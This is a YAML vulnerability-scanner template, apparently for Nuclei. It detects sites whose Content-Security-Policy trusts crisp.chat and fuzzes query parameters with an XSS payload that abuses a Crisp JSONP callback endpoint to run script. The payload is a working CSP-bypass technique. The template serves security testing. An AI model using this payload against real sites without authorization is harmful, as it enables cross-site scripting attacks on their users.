id: crisp-client-csp-bypass

info:
  name: Content-Security-Policy Bypass - Crisp Client
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,crisp-client,vuln

flow: http(1) && headless(1)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
          - "crisp.chat"
        condition: and
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: crisp_client_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1)//"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "crisp_client_csp_xss == true"
